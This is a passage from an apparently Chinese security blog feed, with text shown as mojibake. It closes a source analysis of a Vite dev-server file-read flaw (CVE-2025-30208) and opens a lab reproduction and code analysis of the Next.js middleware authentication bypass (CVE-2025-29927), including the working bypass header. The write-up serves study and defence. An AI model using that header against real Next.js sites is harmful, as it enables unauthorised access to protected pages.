cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> resolved = <span class="variable language_">module</span></span><br><span class="line">    ? <span class="literal">undefined</span></span><br><span class="line">    : ((<span class="keyword">await</span> pluginContainer.<span class="title function_">resolveId</span>(url, <span class="literal">undefined</span>)) ?? <span class="literal">undefined</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// resolve</span></span><br><span class="line">  <span class="keyword">const</span> id = <span class="variable language_">module</span>?.<span class="property">id</span> ?? resolved?.<span class="property">id</span> ?? url</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">module</span> ??= environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleById</span>(id)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// if a different url maps to an existing loaded id,  make sure we relate this url to the id</span></span><br><span class="line">    <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">_ensureEntryFromUrl</span>(url, <span class="literal">undefined</span>, resolved)</span><br><span class="line">    <span class="comment">// try use cache from id</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">    environment,</span><br><span class="line">    id,</span><br><span class="line">    url,</span><br><span class="line">    options,</span><br><span class="line">    timestamp,</span><br><span class="line">    <span class="variable language_">module</span>,</span><br><span class="line">    resolved,</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; depsOptimizer &#125; = environment</span><br><span class="line">  <span class="keyword">if</span> (!depsOptimizer?.<span class="title function_">isOptimizedDepFile</span>(id)) &#123;</span><br><span class="line">    environment.<span class="title function_">_registerRequestProcessing</span>(id, <span class="function">() =&gt;</span> result)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331220016579.png" class="" title="This is an example image"><p>è½¬æ¢ä¸ºmoduleï¼Œå¾—åˆ°ç£ç›˜ä¸­çš„filePathã€‚</p><p>æ¥ä¸‹æ¥å°†æ–‡ä»¶å†…å®¹å†™å…¥åˆ°cacheç„¶åè¿”å›åˆ°resultä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const request = doTransform(environment, url, options, timestamp)</span><br><span class="line"></span><br><span class="line">// Cache the request and clear it once processing is done</span><br><span class="line">environment._pendingRequests.set(cacheKey, &#123;</span><br><span class="line">  request,</span><br><span class="line">  timestamp,</span><br><span class="line">  abort: clearCache,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">return request.finally(clearCache)</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331220902142.png" class="" title="This is an example image"><p>æœ€ååœ¨ç•Œé¢äº§ç”Ÿå“åº”ã€‚</p><p>çœ‹çœ‹6.2.4ç‰ˆæœ¬ï¼ˆæ–°ç‰ˆæœ¬ï¼‰çš„rawREå’ŒurlREï¼Œè¿™é‡Œè¿˜å¤šäº†ä¸ªinlineRE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const urlRE = /[?&amp;]url\b/</span><br><span class="line">const rawRE = /[?&amp;]raw\b/</span><br><span class="line">const inlineRE = /[?&amp;]inline\b/</span><br><span class="line">const trailingQuerySeparatorsRE = /[?&amp;]+$/</span><br></pre></td></tr></table></figure><p>å¼•å…¥äº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼&#x2F;[?&amp;]+$&#x2F;æ¥åŒ¹é…è¿ç»­çš„?å’Œ&amp;ï¼Œè¿™æ®µä»£ç ç”¨äºæ¸…é™¤urlæœ«å°¾çš„å¤šé—®å·</p><p>è¿™é‡Œå°±ä¿®è¡¥äº†ä¸Šè¿°æ¼æ´ï¼</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://forum.butian.net/index.php/article/681">https://forum.butian.net/index.php/article/681</a></p><p><a href="https://www.xaitx.com/tech/2025-03-26.html">https://www.xaitx.com/tech/2025-03-26.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CVEå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVEå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Next.jsä¸­é—´ä»¶é‰´æƒç»•è¿‡æ¼æ´å¤ç°(CVE-2025-29927)</title>
      <link href="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/"/>
      <url>/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€äº›æ¦‚å¿µäº†è§£"><a href="#ä¸€äº›æ¦‚å¿µäº†è§£" class="headerlink" title="ä¸€äº›æ¦‚å¿µäº†è§£"></a>ä¸€äº›æ¦‚å¿µäº†è§£</h2><p>Next.jsæ˜¯ä¸€ä¸ªç”±Vercelå¼€å‘çš„åŸºäºReactçš„Webå¼€å‘æ¡†æ¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªâ€œå…¨æ ˆæ¡†æ¶â€ï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨javascriptæˆ–è€…typescriptå¼€å‘ä¸€ä¸ªå®Œæ•´åŒ…å«å‰åç«¯çš„ç½‘ç«™ï¼Œè€Œä¸”å‰åç«¯çš„ä»£ç éƒ½æ”¾åœ¨ä¸€ä¸ªé¡¹ç›®é‡Œï¼Œç¼–å†™ååˆ†æ–¹ä¾¿ã€‚</p><p>Next.jsçš„åç«¯æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä¸¤ç§æ¨¡å¼æ¥è¿è¡Œï¼Œåˆ†åˆ«æ˜¯node.jså’Œedgeã€‚node.jsæ˜¯é»˜è®¤çš„è¿è¡Œæ¨¡å¼ï¼Œå¯ä»¥ç†è§£ä¸ºä»£ç è¿è¡Œåœ¨ä¼ ç»Ÿçš„node.jsæœåŠ¡å™¨ä¸Šï¼Œä»–æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥æ“ä½œæ–‡ä»¶ã€æ•°æ®åº“ç­‰ç­‰ï¼›edgeæ˜¯å°†ä»£ç è¿è¡Œåœ¨è¾¹ç¼˜è®¡ç®—æœåŠ¡ä¸Šï¼Œæ¯”å¦‚Vercel Edge Functionså’ŒCloudflare Pagesç­‰ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å°†edgeç†è§£ä¸ºä¸€ç§â€œå—é™â€çš„åç«¯å¤„ç†é€»è¾‘ï¼Œå®ƒçš„ä»£ç è¿è¡Œåœ¨å…¨çƒå„åœ°çš„CDNæœåŠ¡å™¨ä¸­ï¼Œç¦»ç”¨æˆ·æ›´è¿‘ï¼Œéå¸¸é€‚åˆç”¨äºå¤„ç†ä¸€äº›â€œè½»å·¥ä½œâ€ï¼Œæ¯”å¦‚æ•°æ®æ ¡éªŒã€é‰´æƒã€å›½é™…åŒ–ç­‰ã€‚ä½†ä¹Ÿæ˜¯å› ä¸ºå…¶è¿è¡Œåœ¨CDNèŠ‚ç‚¹ä¸­ï¼Œå®ƒæ— æ³•ä½¿ç”¨node.jsçš„åŸç”Ÿæ¨¡å—ï¼Œæ¯”å¦‚æ–‡ä»¶æ“ä½œç­‰ã€‚</p><p>next.jsä¸­æä¾›äº†å¤§éƒ¨åˆ†ä¼ ç»ŸWebå¼€å‘æ¡†æ¶éƒ½ä¼šæœ‰çš„åŠŸèƒ½â€”â€”middlewareï¼ˆä¸­é—´ä»¶ï¼‰ã€‚å’Œä¼ ç»Ÿåç«¯æ¡†æ¶ç›¸åŒçš„æ˜¯ï¼Œmiddlewareåœ¨next.jsä¸­ä¹Ÿå¸¸ç”¨æ¥æ£€æŸ¥ç”¨æˆ·èº«ä»½ã€å›½é™…åŒ–ã€è®¾ç½®HTTPå¤´ç­‰ï¼›å’Œä¼ ç»Ÿåç«¯æ¡†æ¶ä¸åŒçš„æ˜¯ï¼Œnext.jsçš„middlewareä¸€å®šè¿è¡Œåœ¨edgeæ¨¡å¼ä¸‹ï¼Œä¸ä¸€å®šä¼šå’Œåç«¯é€»è¾‘è¿è¡Œåœ¨ä¸€èµ·ã€‚</p><p>CVE-2025-29927è¿™ä¸ªæ¼æ´å°±æ˜¯ä½äºmiddlewareä¸­ã€‚ä¸€ä¸ªmiddlewareç”¨äºæ£€æŸ¥ç”¨æˆ·èº«ä»½æ˜¯å¦åˆæ³•ï¼Œç”±äºæ£€æŸ¥çš„è¿‡ç¨‹éœ€è¦æŸ¥è¯¢æ•°æ®åº“ï¼Œæ‰€ä»¥å®ƒä¼šå‘é€ä¸€ä¸ªæ–°çš„è¯·æ±‚è®¿é—®ç”¨æˆ·æ ¡éªŒAPIã€‚ æ­¤æ—¶ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œç”±äºnext.jsæ˜¯â€œå…¨æ ˆâ€æ¡†æ¶ï¼Œè¿™ä¸ªæ£€æŸ¥ç”¨æˆ·èº«ä»½çš„APIä¹Ÿä¼šç»è¿‡middlewareï¼Œè¿™æ ·æ•°æ®æµå°±ä¼šè¿›å…¥é€’å½’æ­»å¾ªç¯ã€‚next.jsä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°±ä¸ºmiddlewareä¸­å‘å‡ºçš„è¯·æ±‚å¢åŠ äº†ä¸€ä¸ªx-middleware-subrequestå¤´ï¼Œæ¯æ¬¡å‘é€è¯·æ±‚æ—¶å€¼æ·»åŠ ä¸€ä¸ªâ€œmiddlewareâ€å­—ç¬¦ä¸²ï¼›å¹¶ä¸”åœ¨æ”¶åˆ°å¸¦æœ‰x-middleware-subrequestçš„å¤´ä¸”å‘ç°é€’å½’è¶…è¿‡5æ¬¡åï¼Œå°±ä¸å†æ‰§è¡Œmiddlewareï¼Œè¿™æ ·middlewareä¸­å‘å‡ºçš„è¯·æ±‚ä¸ä¼šå†æœ‰é€’å½’é—®é¢˜ã€‚ é‚£ä¹ˆæ¼æ´å¤ç°æ–¹æ³•å°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œæ”»å‡»è€…åªè¦åœ¨å‘é€ç»™next.jsçš„è¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªå¤´<strong>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</strong>ï¼Œå°±å¯ä»¥ç»•è¿‡next.jsçš„ä¸­é—´ä»¶ã€‚å¦‚æœå¼€å‘è€…å°†æ ¡éªŒç”¨æˆ·èº«ä»½çš„é€»è¾‘æ”¾åœ¨ä¸­é—´ä»¶é‡Œï¼Œå°±å°†å¯¼è‡´è®¤è¯ç»•è¿‡æ¼æ´ã€‚</p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·è¯·æ±‚ â†’ ä¸­é—´ä»¶Aï¼ˆèº«ä»½éªŒè¯ï¼‰ â†’ å‘èµ·APIè¯·æ±‚ â†’ ä¸­é—´ä»¶Aå†æ¬¡æ‰§è¡Œ â†’ å†æ¬¡å‘èµ·APIè¯·æ±‚ â†’ ...</span><br></pre></td></tr></table></figure></blockquote><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>Next.js ä½¿ç”¨å†…éƒ¨å¤´å­—æ®µâ€œx-middleware-subrequestâ€æ¥é˜²æ­¢é€’å½’è¯·æ±‚å¯¼è‡´çš„æ— é™å¾ªç¯ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨è¯·æ±‚ä¸­ä¼ªé€ è¯¥å¤´å­—æ®µï¼Œè·³è¿‡ä¸­é—´ä»¶çš„æ‰§è¡Œï¼Œä»è€Œç»•è¿‡å…³é”®çš„å®‰å…¨æ£€æŸ¥ï¼Œä¾‹å¦‚æˆæƒ Cookie éªŒè¯ã€‚ </p><h2 id="å—å½±å“çš„ç‰ˆæœ¬"><a href="#å—å½±å“çš„ç‰ˆæœ¬" class="headerlink" title="å—å½±å“çš„ç‰ˆæœ¬"></a>å—å½±å“çš„ç‰ˆæœ¬</h2><p>Next.js 15.x &lt; 15.2.3<br>Next.js 14.x &lt; 14.2.25<br>Next.js 13.x &lt; 13.5.9</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>è¿™é‡Œçš„æ¼æ´ç¯å¢ƒæˆ‘ä»¬ç›´æ¥ç”¨pç¥çš„vulhubã€‚</p><p><a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md</a></p><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331100042571.png" class="" title="This is an example image"><p>æˆ‘ä»¬ç”¨æµè§ˆå™¨æ’ä»¶çœ‹çœ‹</p><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331100111643.png" class="" title="This is an example image"><p>å‘ç°æ˜¯next.jsæ¡†æ¶çš„ï¼Œä¸”ç‰ˆæœ¬ä¸º15.2.2ï¼Œç¬¦åˆæ¼æ´ç‰ˆæœ¬ï¼é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æ¼æ´å¤ç°ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç•Œé¢ã€‚</p><p>ç„¶åæˆ‘ä»¬ç”¨hackbaråŠ ä¸€ä¸ªè¯·æ±‚å¤´å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331102344712.png" class="" title="This is an example image"><p>è‹¥æˆ‘ä»¬æ²¡æœ‰åŠ è¯·æ±‚å¤´ï¼Œè®¿é—®<a href="http://192.168.79.128:3000/%E6%98%AF%E8%B7%B3%E8%BD%AC%E5%88%B0/login%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E6%88%91%E4%BB%AC%E5%8A%A0%E4%BA%86%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%A4%B4%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%B7%B3%E8%BD%AC%E5%88%B0/dashboard%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%EF%BC%81">http://192.168.79.128:3000/æ˜¯è·³è½¬åˆ°/loginçš„ï¼Œä½†æ˜¯æˆ‘ä»¬æˆ‘ä»¬åŠ äº†è¿™ä¸ªè¯·æ±‚å¤´ï¼Œå°±ä¼šè·³è½¬åˆ°/dashboardï¼Œå®ç°äº†é‰´æƒç»•è¿‡ï¼</a></p><p>è¿™ä¸ªæ¼æ´çš„å¤ç°æ˜¯éå¸¸ç®€å•çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æ¼æ´çš„æºç åˆ†æã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å…³é”®ç‚¹è‡ªç„¶åœ¨äºè¯·æ±‚å¤´x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</p><p>åœ¨ Next.js ä¸­ï¼Œä¸­é—´ä»¶ï¼ˆMiddlewareï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥ç”¨äºåœ¨è¯·æ±‚åˆ°è¾¾ API è·¯ç”±æˆ–é¡µé¢ç»„ä»¶ä¹‹å‰æ‰§è¡Œå…¨å±€é€»è¾‘ï¼Œæ¯”å¦‚èº«ä»½éªŒè¯ã€è¯·æ±‚æ‹¦æˆªã€é‡å®šå‘ç­‰ã€‚</p><p>Next.js çš„ä¸­é—´ä»¶ï¼ˆMiddlewareï¼‰è®¾è®¡ç”¨äºå¤„ç†å…¨å±€è¯·æ±‚é€»è¾‘ï¼ˆå¦‚èº«ä»½éªŒè¯ã€è¯·æ±‚æ‹¦æˆªï¼Œå‡è®¾å¼€å‘è€…ç¼–å†™äº†ä¸€ä¸ªèº«ä»½éªŒè¯ä¸­é—´ä»¶ï¼Œå…¶åŠŸèƒ½æ˜¯ï¼šå½“ç”¨æˆ·è®¿é—®å—ä¿æŠ¤èµ„æºæ—¶ï¼Œä¸­é—´ä»¶éœ€å‘æ ¡éªŒ API å‘é€è¯·æ±‚ä»¥éªŒè¯ç”¨æˆ·æƒé™ï¼ˆå¦‚æŸ¥è¯¢æ•°æ®åº“æˆ–è°ƒç”¨å¤–éƒ¨æœåŠ¡ï¼‰ã€‚</p><p>ç”±äº Next.js æ˜¯ã€Œå…¨æ ˆæ¡†æ¶ã€ï¼Œæ‰€æœ‰è¯·æ±‚ï¼ˆåŒ…æ‹¬ä¸­é—´ä»¶å†…éƒ¨å‘èµ·çš„ API è¯·æ±‚ï¼‰å‡ä¼šå†æ¬¡ç»è¿‡ä¸­é—´ä»¶æœ¬èº«ã€‚è¿™å¯¼è‡´ä»¥ä¸‹é€’å½’æµç¨‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·è¯·æ±‚ â†’ ä¸­é—´ä»¶Aï¼ˆèº«ä»½éªŒè¯ï¼‰ â†’ å‘èµ·APIè¯·æ±‚ â†’ ä¸­é—´ä»¶Aå†æ¬¡æ‰§è¡Œ â†’ å†æ¬¡å‘èµ·APIè¯·æ±‚ â†’ ...</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¼•å‘æ— é™é€’å½’ï¼Œå¯¼è‡´æœåŠ¡å´©æºƒæˆ–å“åº”è¶…æ—¶ã€‚</p><p>ä¸ºæ‰“ç ´é€’å½’å¾ªç¯ï¼ŒNext.js å¼•å…¥äº†ä¸¤é¡¹æœºåˆ¶ï¼š</p><ul><li><strong>è¯·æ±‚æ ‡è®°</strong>ï¼š ä¸­é—´ä»¶å†…éƒ¨å‘èµ·çš„è¯·æ±‚ä¼šè‡ªåŠ¨æ·»åŠ  <code>x-middleware-subrequest</code> å¤´ï¼Œå…¶å€¼æŒ‰å±‚çº§é€’å¢ï¼ˆå¦‚ <code>middleware:middleware:middleware</code>ï¼‰ã€‚</li><li><strong>é€’å½’ç»ˆæ­¢æ¡ä»¶</strong>ï¼š å½“æ£€æµ‹åˆ° <code>x-middleware-subrequest</code> å¤´ä¸­åŒ…å«å½“å‰ä¸­é—´ä»¶æ ‡è¯†ï¼ˆå¦‚ <code>middleware</code>ï¼‰çš„æ¬¡æ•°è¶…è¿‡é˜ˆå€¼ï¼ˆé»˜è®¤5æ¬¡ï¼‰ï¼Œä¸­é—´ä»¶ç›´æ¥è¿”å›ç©ºå“åº”ï¼Œç»ˆæ­¢é€’å½’</li></ul><p>ä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼šnext.js-15.2.2\packages\next\src\server\web\sandbox</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> run = <span class="title function_">withTaggedErrors</span>(<span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">runWithTaggedErrors</span>(<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> runtime = <span class="keyword">await</span> <span class="title function_">getRuntimeContext</span>(params)</span><br><span class="line">  <span class="keyword">const</span> subreq = params.<span class="property">request</span>.<span class="property">headers</span>[<span class="string">`x-middleware-subrequest`</span>]</span><br><span class="line">  <span class="keyword">const</span> subrequests = <span class="keyword">typeof</span> subreq === <span class="string">&#x27;string&#x27;</span> ? subreq.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>) : []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">MAX_RECURSION_DEPTH</span> = <span class="number">5</span></span><br><span class="line">  <span class="keyword">const</span> depth = subrequests.<span class="title function_">reduce</span>(</span><br><span class="line">    <span class="function">(<span class="params">acc, curr</span>) =&gt;</span> (curr === params.<span class="property">name</span> ? acc + <span class="number">1</span> : acc),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (depth &gt;= <span class="variable constant_">MAX_RECURSION_DEPTH</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">waitUntil</span>: <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">      <span class="attr">response</span>: <span class="keyword">new</span> runtime.<span class="property">context</span>.<span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;x-middleware-next&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹è¿™æ®µä»£ç ï¼Œå°†x-middleware-subrequestè¯·æ±‚å¤´èµ‹å€¼ç»™subreqï¼Œå†ä»¥<code>:</code>åˆ†å‰²ä¸ºæ•°ç»„subrequestsã€‚</p><p>è‹¥subrequestsä¸­åŒ…å«å½“å‰ä¸­é—´ä»¶çš„åå­—ï¼Œé‚£ä¹ˆæ‰§è¡Œacc+1ï¼Œä¹Ÿå°±æ˜¯é€’å¢ã€‚å½“accçš„å€¼&gt;&#x3D;5æ—¶ï¼Œä¸­é—´ä»¶è¿”å›ç©ºç›¸åº”ï¼Œè®¾ç½®è¿”å›å¤´ä¸ºâ€™x-middleware-nextâ€™: â€˜1â€™ï¼Œè¡¨ç¤ºå¿½ç•¥ä¸­é—´ä»¶çš„æ‰€æœ‰é€»è¾‘ï¼ˆåŒ…æ‹¬é‰´æƒæ£€æŸ¥ï¼‰ã€‚</p><p>æ‰€ä»¥æ¼æ´çš„åˆ©ç”¨æ€è·¯æ˜¯ï¼Œåªè¦åœ¨å‘é€ç»™next.jsçš„è¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªå¤´**x-middleware-subrequest:**ï¼Œè®©å…¶å¾ªç¯5æ¬¡ä¸­é—´ä»¶æ–‡ä»¶è·¯å¾„ï¼Œå°±å¯ä»¥ç»•è¿‡next.jsçš„ä¸­é—´ä»¶ã€‚å¦‚æœå¼€å‘è€…å°†æ ¡éªŒç”¨æˆ·èº«ä»½çš„é€»è¾‘æ”¾åœ¨ä¸­é—´ä»¶é‡Œï¼Œå°±å°†å¯¼è‡´è®¤è¯ç»•è¿‡æ¼æ´ã€‚</p><h3 id="æ—§ç‰ˆæœ¬ï¼ˆv"><a href="#æ—§ç‰ˆæœ¬ï¼ˆv" class="headerlink" title="æ—§ç‰ˆæœ¬ï¼ˆv&lt;12.2ï¼‰"></a>æ—§ç‰ˆæœ¬ï¼ˆv&lt;12.2ï¼‰</h3><p>ä¸»è¦çš„å¤„ç†é€»è¾‘ï¼š</p><blockquote><p>next.js&#x2F;packages&#x2F;next&#x2F;server&#x2F;next-server.ts</p></blockquote><p>å¦‚æœæˆ‘ä»¬æœ‰ä¸­é—´ä»¶ï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨ runMiddleware å‡½æ•°</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">async</span> <span class="title function_">runMiddleware</span>(<span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">request</span>: <span class="title class_">IncomingMessage</span></span><br><span class="line">    <span class="attr">response</span>: <span class="title class_">ServerResponse</span></span><br><span class="line">    <span class="attr">parsedUrl</span>: <span class="title class_">ParsedNextUrl</span></span><br><span class="line">    <span class="attr">parsed</span>: <span class="title class_">UrlWithParsedQuery</span></span><br><span class="line">  &#125;): <span class="title class_">Promise</span>&lt;<span class="title class_">FetchEventResult</span> | <span class="literal">null</span>&gt; &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">middlewareBetaWarning</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">page</span>: &#123; <span class="attr">name</span>?: <span class="built_in">string</span>; <span class="attr">params</span>?: &#123; [<span class="attr">key</span>: <span class="built_in">string</span>]: <span class="built_in">string</span> &#125; &#125; = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="variable 